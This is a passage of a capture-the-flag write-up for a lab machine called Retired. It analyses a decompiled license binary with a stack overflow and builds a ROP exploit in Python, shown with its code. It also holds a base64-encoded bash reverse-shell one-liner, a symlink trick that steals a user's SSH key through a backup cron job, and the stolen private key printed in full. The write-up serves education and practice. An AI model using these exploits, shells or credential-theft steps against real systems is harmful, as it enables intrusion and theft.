} inet_ntop(2, \u0026amp;clientaddr.sin_addr, clientaddr_s, 0x10); printf(\"[+] accepted client connection from %s:%d\\n\", clientaddr_s, (ulong) clientaddr.sin_port); _Var2 = fork(); if (_Var2 == 0) break; __sysv_signal(0x11, (__sighandler_t) 0x1); close(clientfd); } close(serverfd); activate_license(clientfd); /* WARNING: Subroutine does not return */ exit(0); }  It just starts the socket server on port 1337. Everytime a new connection arrives, the process forks (which means that the parent process will continue listening for new connections and it will not crash). The child process executes the activate_license function:\nvoid activate_license(int sockfd) { int iVar1; ssize_t sVar2; int *piVar3; char *pcVar4; sqlite3_stmt *stmt; sqlite3 *db; uint32_t msglen; char buffer[512]; sVar2 = read(sockfd, \u0026amp;msglen, 4); if (sVar2 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } msglen = ntohl(msglen); printf(\"[+] reading %d bytes\\n\", (ulong) msglen); sVar2 = read(sockfd, buffer, (ulong) msglen); if (sVar2 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = sqlite3_open(\"license.sqlite\", \u0026amp;db); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } sqlite3_busy_timeout(db, 2000); iVar1 = sqlite3_exec(db, \"CREATE TABLE IF NOT EXISTS license ( id INTEGER PRIMARY KEY AUTOINCREMENT, license_key TEXT)\", 0, 0, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_prepare_v2(db, \"INSERT INTO license (license_key) VALUES (?)\", 0xffffffff, \u0026amp;stmt, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_bind_text(stmt, 1, buffer, 0x200, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_step(stmt); if (iVar1 != 0x65) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_reset(stmt); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_finalize(stmt); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_close(db); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } printf(\"[+] activated license: %s\\n\", buffer); return; }  We could check if the SQL statements are injectable, but they are not. Then the way is still binary exploitation. The Buffer Overflow vulnerability is here:\nvoid activate_license(int sockfd) { // ... int iVar1; ssize_t sVar2; uint32_t msglen; char buffer[512]; sVar2 = read(sockfd, \u0026amp;msglen, 4); // ... msglen = ntohl(msglen); printf(\"[+] reading %d bytes\\n\", (ulong) msglen); sVar2 = read(sockfd, buffer, (ulong) msglen); // ... }  The first read instruction reads the file size, and the second copies the file contents into buffer. Since we control the size of the file, we can overflow the reserved buffer for buffer (which is 512 bytes) and thus modify the saved return address that is on the stack.\nExploit preparation This binary cannot be exploited with a common Ret2Libc attack. The problem is that we do not have direct communication with the binary. Instead, we must send the payload as a file to the PHP web server and it will be passed to the binary. We won\u0026rsquo;t get any output, so we cannot make use of memory leaks.\nHowever, we can obtain the needed information from /proc/\u0026lt;PID\u0026gt;/maps:\n$ curl '10.10.11.154?page=/proc/411/maps' 5631036d6000-5631036d7000 r--p 00000000 08:01 2408 /usr/bin/activate_license 5631036d7000-5631036d8000 r-xp 00001000 08:01 2408 /usr/bin/activate_license 5631036d8000-5631036d9000 r--p 00002000 08:01 2408 /usr/bin/activate_license 5631036d9000-5631036da000 r--p 00002000 08:01 2408 /usr/bin/activate_license 5631036da000-5631036db000 rw-p 00003000 08:01 2408 /usr/bin/activate_license 563104ac4000-563104ae5000 rw-p 00000000 00:00 0 [heap] 7f8f07aa9000-7f8f07aab000 rw-p 00000000 00:00 0 7f8f07aab000-7f8f07aac000 r--p 00000000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aac000-7f8f07aae000 r-xp 00001000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aae000-7f8f07aaf000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aaf000-7f8f07ab0000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07ab0000-7f8f07ab1000 rw-p 00004000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07ab1000-7f8f07ab8000 r--p 00000000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ab8000-7f8f07ac8000 r-xp 00007000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ac8000-7f8f07acd000 r--p 00017000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07acd000-7f8f07ace000 r--p 0001b000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ace000-7f8f07acf000 rw-p 0001c000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07acf000-7f8f07ad3000 rw-p 00000000 00:00 0 7f8f07ad3000-7f8f07ae2000 r--p 00000000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07ae2000-7f8f07b7c000 r-xp 0000f000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07b7c000-7f8f07c15000 r--p 000a9000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c15000-7f8f07c16000 r--p 00141000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c16000-7f8f07c17000 rw-p 00142000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c17000-7f8f07c3c000 r--p 00000000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07c3c000-7f8f07d87000 r-xp 00025000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07d87000-7f8f07dd1000 r--p 00170000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd1000-7f8f07dd2000 ---p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd2000-7f8f07dd5000 r--p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd5000-7f8f07dd8000 rw-p 001bd000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd8000-7f8f07ddc000 rw-p 00000000 00:00 0 7f8f07ddc000-7f8f07dec000 r--p 00000000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07dec000-7f8f07ee4000 r-xp 00010000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07ee4000-7f8f07f18000 r--p 00108000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f18000-7f8f07f1c000 r--p 0013b000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f1c000-7f8f07f1f000 rw-p 0013f000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f1f000-7f8f07f21000 rw-p 00000000 00:00 0 7f8f07f26000-7f8f07f27000 r--p 00000000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f27000-7f8f07f47000 r-xp 00001000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f47000-7f8f07f4f000 r--p 00021000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f50000-7f8f07f51000 r--p 00029000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f51000-7f8f07f52000 rw-p 0002a000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f52000-7f8f07f53000 rw-p 00000000 00:00 0 7ffc8b8b8000-7ffc8b8d9000 rw-p 00000000 00:00 0 [stack] 7ffc8b8de000-7ffc8b8e2000 r--p 00000000 00:00 0 [vvar] 7ffc8b8e2000-7ffc8b8e4000 r-xp 00000000 00:00 0 [vdso]  Here we have the base address of the binary (0x5631036d6000), the base address of Glibc (0x7f8f07c17000) and also the start of the stack (0x7ffc8b8b8000). These three values will be useful for exploitation.\nMoreover, let\u0026rsquo;s download Glibc from the machine to develop the exploit:\n$ curl '10.10.11.154?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so' -o libc.so.6  Exploit development The aim of the exploit is to call system inside Glibc (we have the real address) and use a reverse shell command as first argument. Since it is a custom command that is not inside Glibc or the binary, it must be stored on the stack (that\u0026rsquo;s why we need a stack address). Hence, we want the following:\n $rdi to have an address pointing the the command string Call system in Glibc  This is a 64-bit binary, so the calling conventions tell that arguments are passed to functions using registers (in order: $rdi, $rsi, $rdx, $rcx\u0026hellip;). This time we will call system, which takes a single argument that is a pointer to a string (that will be the command we want to execute).\nSince NX is enabled, we must use ROP to set the value of $rdi using a pop rdi; ret gadget. ROP will allow us to redirect code execution to specific addresses that execute the instructions we want and then return to the next address on the stack, where the next gadget will be (that\u0026rsquo;s the meaning of ROP chain).\nWe can find gadgets within the binary or Glibc, it doesn\u0026rsquo;t matter this time:\n$ ROPgadget --binary activate_license | grep ': pop rdi ; ret$' 0x000000000000181b : pop rdi ; ret  The value 0x181b is just an offset. Since PIE is enabled, the base address of the binary is randomized and all addresses are computed as offsets to the base address. Since we have the base address from /proc/\u0026lt;PID\u0026gt;/maps, we know the real address of the gadget at runtime.\nNext, we need to find the offset of system inside Glibc:\n$ readelf -s libc.so.6 | grep system 237: 000000000012d5e0 99 FUNC GLOBAL DEFAULT 14 svcerr_systemerr@@GLIBC_2.2.5 619: 0000000000048e50 45 FUNC GLOBAL DEFAULT 14 __libc_system@@GLIBC_PRIVATE 1430: 0000000000048e50 45 FUNC WEAK DEFAULT 14 system@@GLIBC_2.2.5  Again, 0x48e50 is an offset because the base address of Glibc is randomized due to ASLR. Moreover, we have the base address of Glibc at runtime from before.\nNice, now we must figure out the amount of characters we need to overwrite the saved return address that is on the stack. By experience on 64-bit exploitation, I know that if the reserved buffer for a variable is $x$, then the offset is usually $x + 8$ (if there is no canary). Hence, the offset is 520 this time. Other way to find it is using patterns and GDB.\nI created a Python script that takes the addresses from /proc/\u0026lt;PID\u0026gt;/maps, creates the payload and sends it to the server. It can be found here: first_exploit.py.\nThe function that crafts the payload is this one:\ndef craft_payload(pid, cmd, stack_offset): elf_address, glibc_address, stack_address = get_addresses(pid) pop_rdi_ret = elf_address + 0x0181b system = glibc_address + 0x48e50 padding = b' ' * 200 cmd = padding + cmd.encode() + b'\\0' offset = 520 junk = b'A' * offset payload = junk payload += p64(pop_rdi_ret) payload += p64(stack_address + stack_offset) payload += p64(system) payload += cmd return {'licensefile': ('tmp_name', payload)}  Notice that the command to be executed is inserted after the ROP chain and it is padded with 200 spaces. This is important because we don\u0026rsquo;t know the exact address position of the command string on the stack, so we must use brute force. The padding allows us to have a wide tolerance on the pointer because we can jump at the start of the spaces, in the middle of right where the proper command starts (200 address tolerance), the command will still be executed. Furthermore, the command is ended with a null byte.\nThis is the main function, which has two approaches and sends the payload to the PHP server as a file:\ndef main(): if len(sys.argv) != 3 and len(sys.argv) != 4: print(f'[!] Usage: python3 {sys.argv[0]} \u0026lt;PID\u0026gt; \u0026lt;cmd\u0026gt; [stack offset]') return pid, cmd = sys.argv[1], sys.argv[2] if len(sys.argv) == 4: stack_offset = int(sys.argv[3], 16) requests.post(f'http://{ip}/activate_license.php', files=craft_payload(pid, cmd, stack_offset)) print('[+] Sent payload. Check listener') return print('[+] Starting brute force on stack offset') for stack_offset in range(0x21000, 0, -128): print(f'[*] Stack offset: {hex(stack_offset)}') time.sleep(1) requests.post(f'http://{ip}/activate_license.php', files=craft_payload(pid, cmd, stack_offset))  The first approach is to brute force the address on the stack using an offset (starting from 0x21000 which is the top of the stack address space and decreasing):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ python3 first_exploit.py 411 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' [+] Starting brute force on stack offset [*] Stack offset: 0x21000 [*] Stack offset: 0x20f80 [*] Stack offset: 0x20f00 [*] Stack offset: 0x20e80 [*] Stack offset: 0x20e00 [*] Stack offset: 0x20d80 [*] Stack offset: 0x20d00 [*] Stack offset: 0x20c80 [*] Stack offset: 0x20c00 [*] Stack offset: 0x20b80 [*] Stack offset: 0x20b00 [*] Stack offset: 0x20a80 [*] Stack offset: 0x20a00 [*] Stack offset: 0x20980 [*] Stack offset: 0x20900 [*] Stack offset: 0x20880 [*] Stack offset: 0x20800 [*] Stack offset: 0x20780 [*] Stack offset: 0x20700 [*] Stack offset: 0x20680 [*] Stack offset: 0x20600 [*] Stack offset: 0x20580 [*] Stack offset: 0x20500 [*] Stack offset: 0x20480 ^C [!] Exiting...  Using a command such as a reverse shell, a ping or a web request, we can figure out the stack offset. Although it is not strictly needed if using a reverse shell, we can execute the exploit again indicating the offset and gain Remote Code Execution (RCE) instantly:\n$ python3 first_exploit.py 411 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' 0x20500 [+] Sent payload. Check listener  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.154. Ncat: Connection from 10.10.11.154:53848. bash: cannot set terminal process group (411): Inappropriate ioctl for device bash: no job control in this shell www-data@retired:~$ script /dev/null -c bash script /dev/null -c bash Script started, output log file is '/dev/null'. www-data@retired:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@retired:~$ export TERM=xterm www-data@retired:~$ export SHELL=bash www-data@retired:~$ stty rows 50 columns 158  There are more ways to exploit the binary. In this second_exploit.py I used the writable addresses of the binary to store the reverse shell command using the \u0026ldquo;write-what-where\u0026rdquo; primitive in blocks of 8 bytes using pop rax; ret, pop rdi; ret gadgets and then use mov qword ptr [rax], rdi; ret to move the command blocks to the writable addresses (detailed explanation here).\nMoreover, it is possible to call mprotect to modify the permissions of the stack and configure it as executable, so we can enter shellcode in the stack and run it to obtain a reverse shell. This technique is used by third_exploit.py (detailed explanation here).\nSystem enumeration The first this we notice is that there are some ZIP files in /var/www:\nwww-data@retired:~$ ls -la total 1760 drwxrwsrwx 3 www-data www-data 4096 Apr 3 12:16 . drwxr-xr-x 12 root root 4096 Mar 11 14:36 .. -rw-r--r-- 1 dev www-data 505153 Apr 3 12:14 2022-04-03_12-14-03-html.zip -rw-r--r-- 1 dev www-data 505153 Apr 3 12:15 2022-04-03_12-15-03-html.zip -rw-r--r-- 1 dev www-data 505153 Apr 3 12:16 2022-04-03_12-16-03-html.zip drwxrwsrwx 5 www-data www-data 4096 Mar 11 14:36 html -rw-r--r-- 1 www-data www-data 262144 Apr 3 12:15 license.sqlite  They all contain a backup of the web server source files:\nwww-data@retired:~$ unzip -l 2022-04-03_12-16-03-html.zip Archive: 2022-04-03_12-16-03-html.zip Length Date Time Name --------- ---------- ----- ---- 0 2022-03-11 14:36 var/www/html/ 0 2022-03-11 14:36 var/www/html/js/ 1636 2021-10-13 02:59 var/www/html/js/scripts.js 585 2021-10-13 02:58 var/www/html/activate_license.php 0 2022-03-11 14:36 var/www/html/assets/ 23462 2021-10-13 02:59 var/www/html/assets/favicon.ico 0 2022-03-11 14:36 var/www/html/assets/img/ 333 2021-10-13 02:59 var/www/html/assets/img/close-icon.svg 14220 2021-10-13 02:59 var/www/html/assets/img/navbar-logo.svg 0 2022-03-11 14:36 var/www/html/assets/img/about/ 10187 2021-10-13 02:59 var/www/html/assets/img/about/2.jpg 16175 2021-10-13 02:59 var/www/html/assets/img/about/4.jpg 18029 2021-10-13 02:59 var/www/html/assets/img/about/3.jpg 19668 2021-10-13 02:59 var/www/html/assets/img/about/1.jpg 0 2022-03-11 14:36 var/www/html/assets/img/logos/ 3223 2021-10-13 02:59 var/www/html/assets/img/logos/facebook.svg 4137 2021-10-13 02:59 var/www/html/assets/img/logos/microsoft.svg 3282 2021-10-13 02:59 var/www/html/assets/img/logos/google.svg 2284 2021-10-13 02:59 var/www/html/assets/img/logos/ibm.svg 0 2022-03-11 14:36 var/www/html/assets/img/team/ 61067 2021-10-13 02:59 var/www/html/assets/img/team/2.jpg 57725 2021-10-13 02:59 var/www/html/assets/img/team/3.jpg 40338 2021-10-13 02:59 var/www/html/assets/img/team/1.jpg 238317 2021-10-13 02:59 var/www/html/assets/img/header-bg.jpg 4144 2022-03-11 11:34 var/www/html/beta.html 11414 2021-10-13 02:58 var/www/html/default.html 348 2022-03-11 11:29 var/www/html/index.php 0 2022-03-11 14:36 var/www/html/css/ 219875 2021-10-13 02:59 var/www/html/css/styles.css --------- ------- 750449 29 files  Moreover, the ZIP files belong to user dev and group www-data. Every minute, there is a new ZIP file generated, let\u0026rsquo;s search for backup then and see if there is a Cron job:\nwww-data@retired:~$ cat /usr/bin/webbackup  #!/bin/bash set -euf -o pipefail cd /var/www/ SRC=/var/www/html DST=\"/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip\" /usr/bin/rm --force -- \"$DST\" /usr/bin/zip --recurse-paths \"$DST\" \"$SRC\" KEEP=10 /usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \\ | sort --zero-terminated --numeric-sort --reverse \\ | while IFS= read -r -d '' backup; do if [ \"$KEEP\" -le 0 ]; then /usr/bin/rm --force -- \"$backup\" fi KEEP=\"$((KEEP-1))\" done  Although date and sort are called using relative paths, there is no PATH hijacking vulnerability.\nLateral movement to user dev Instead, we can create a symbolic link that points to /home/dev/.ssh/id_rsa, so that it is compressed into a ZIP archive and then we can extract it:\nwww-data@retired:~/html$ ln -s /home/dev/.ssh/id_rsa dev_id_rsa  And after a minute, the new ZIP file will contain the SSH private key of dev:\nwww-data@retired:~/html$ cd .. www-data@retired:~$ unzip -l 2022-04-03_13-14-04-html.zip Archive: 2022-04-03_13-14-04-html.zip Length Date Time Name --------- ---------- ----- ---- 0 2022-04-03 13:13 var/www/html/ 0 2022-03-11 14:36 var/www/html/js/ 1636 2021-10-13 02:59 var/www/html/js/scripts.js 585 2021-10-13 02:58 var/www/html/activate_license.php 0 2022-03-11 14:36 var/www/html/assets/ 23462 2021-10-13 02:59 var/www/html/assets/favicon.ico 0 2022-03-11 14:36 var/www/html/assets/img/ 333 2021-10-13 02:59 var/www/html/assets/img/close-icon.svg 14220 2021-10-13 02:59 var/www/html/assets/img/navbar-logo.svg 0 2022-03-11 14:36 var/www/html/assets/img/about/ 10187 2021-10-13 02:59 var/www/html/assets/img/about/2.jpg 16175 2021-10-13 02:59 var/www/html/assets/img/about/4.jpg 18029 2021-10-13 02:59 var/www/html/assets/img/about/3.jpg 19668 2021-10-13 02:59 var/www/html/assets/img/about/1.jpg 0 2022-03-11 14:36 var/www/html/assets/img/logos/ 3223 2021-10-13 02:59 var/www/html/assets/img/logos/facebook.svg 4137 2021-10-13 02:59 var/www/html/assets/img/logos/microsoft.svg 3282 2021-10-13 02:59 var/www/html/assets/img/logos/google.svg 2284 2021-10-13 02:59 var/www/html/assets/img/logos/ibm.svg 0 2022-03-11 14:36 var/www/html/assets/img/team/ 61067 2021-10-13 02:59 var/www/html/assets/img/team/2.jpg 57725 2021-10-13 02:59 var/www/html/assets/img/team/3.jpg 40338 2021-10-13 02:59 var/www/html/assets/img/team/1.jpg 238317 2021-10-13 02:59 var/www/html/assets/img/header-bg.jpg 4144 2022-03-11 11:34 var/www/html/beta.html 11414 2021-10-13 02:58 var/www/html/default.html 348 2022-03-11 11:29 var/www/html/index.php 2590 2022-03-11 11:12 var/www/html/dev_id_rsa 0 2022-03-11 14:36 var/www/html/css/ 219875 2021-10-13 02:59 var/www/html/css/styles.css --------- ------- 753039 30 files  Let\u0026rsquo;s extract the files:\nwww-data@retired:~$ mv 2022-04-03_13-14-04-html.zip /tmp www-data@retired:~$ cd /tmp www-data@retired:/tmp$ unzip 2022-04-03_13-14-04-html.zip Archive: 2022-04-03_13-14-04-html.zip creating: var/www/html/ creating: var/www/html/js/ inflating: var/www/html/js/scripts.js inflating: var/www/html/activate_license.php creating: var/www/html/assets/ inflating: var/www/html/assets/favicon.ico creating: var/www/html/assets/img/ inflating: var/www/html/assets/img/close-icon.svg inflating: var/www/html/assets/img/navbar-logo.svg creating: var/www/html/assets/img/about/ inflating: var/www/html/assets/img/about/2.jpg inflating: var/www/html/assets/img/about/4.jpg inflating: var/www/html/assets/img/about/3.jpg inflating: var/www/html/assets/img/about/1.jpg creating: var/www/html/assets/img/logos/ inflating: var/www/html/assets/img/logos/facebook.svg inflating: var/www/html/assets/img/logos/microsoft.svg inflating: var/www/html/assets/img/logos/google.svg inflating: var/www/html/assets/img/logos/ibm.svg creating: var/www/html/assets/img/team/ inflating: var/www/html/assets/img/team/2.jpg inflating: var/www/html/assets/img/team/3.jpg inflating: var/www/html/assets/img/team/1.jpg inflating: var/www/html/assets/img/header-bg.jpg inflating: var/www/html/beta.html inflating: var/www/html/default.html inflating: var/www/html/index.php inflating: var/www/html/dev_id_rsa creating: var/www/html/css/ extracting: var/www/html/css/styles.css www-data@retired:/tmp$ cat var/www/html/dev_id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ= -----END OPENSSH PRIVATE KEY-----  Now we can connect as dev and get the user.txt flag:\n$ chmod 600 id_rsa $ ssh -i id_rsa dev@10.10.11.154 dev@retired:~$ cat user.txt f78b01da6c3d56436a6005509fdff826  Privilege escalation This user owns a directory called emuemu (remember from the website):\ndev@retired:~$ ls -la total 40 drwx------ 6 dev dev 4096 Mar 11 14:36 . drwxr-xr-x 3 root root 4096 Mar 11 14:36 .. lrwxrwxrwx 1 root root 9 Oct 13 02:59 .bash_history -\u0026gt; /dev/null -rw------- 1 dev dev 220 Aug 4 2021 .bash_logout -rw------- 1 dev dev 3526 Aug 4 2021 .bashrc drwxr-xr-x 3 dev dev 4096 Mar 11 14:36 .local -rw------- 1 dev dev 807 Aug 4 2021 .profile drwx------ 2 dev dev 4096 Mar 11 14:36 .ssh drwx------ 2 dev dev 4096 Mar 11 14:36 activate_license drwx------ 3 dev dev 4096 Mar 11 14:36 emuemu -rw-r----- 1 root dev 33 Apr 3 21:28 user.txt  We have all this stuff:\ndev@retired:~/emuemu$ ls -la total 68 drwx------ 3 dev dev 4096 Mar 11 14:36 . drwx------ 6 dev dev 4096 Mar 11 14:36 .. -rw------- 1 dev dev 673 Oct 13 02:59 Makefile -rw------- 1 dev dev 228 Oct 13 02:59 README.md -rw------- 1 dev dev 16608 Oct 13 02:59 emuemu -rw------- 1 dev dev 168 Oct 13 02:59 emuemu.c -rw------- 1 dev dev 16864 Oct 13 02:59 reg_helper -rw------- 1 dev dev 502 Oct 13 02:59 reg_helper.c drwx------ 2 dev dev 4096 Mar 11 14:36 test dev@retired:~/emuemu$ ls -la test total 12 drwx------ 2 dev dev 4096 Mar 11 14:36 . drwx------ 3 dev dev 4096 Mar 11 14:36 .. -rwxr-xr-x 1 dev dev 70 Oct 13 02:59 examplerom  Let\u0026rsquo;s check the README.md:\ndev@retired:~/emuemu$ cat README.md EMUEMU is the official software emulator for the handheld console OSTRICH. After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal. For example the ROM named `rom` can be run with `./rom`.  It says that we can execute a ROM like a common executable file:\ndev@retired:~/emuemu$ test/examplerom EMUEMU is still under development.  Nice, we are able to execute a ROM, let\u0026rsquo;s check the C files:\ndev@retired:~/emuemu$ cat emuemu.c  #include \u0026lt;stdio.h\u0026gt; /* currently this is only a dummy implementation doing nothing */ int main(void) { puts(\"EMUEMU is still under development.\"); return 1; }  Hey! This file generates the ROM we just executed. Let\u0026rsquo;s verify it:\ndev@retired:~/emuemu$ file test/examplerom test/examplerom: data dev@retired:~/emuemu$ cat test/examplerom 7OSTRICHROM this is a minimal rom with a valid file type signature dev@retired:~/emuemu$ xxd test/examplerom 00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74 .7OSTRICH.ROM..t 00000010: 6869 7320 6973 2061 206d 696e 696d 616c his is a minimal 00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69 rom with a vali 00000030: 6420 6669 6c65 2074 7970 6520 7369 676e d file type sign 00000040: 6174 7572 650a ature.  ROM analysis What\u0026rsquo;s happening here? test/examplerom seems to be a normal file. At least, it is not an ELF. 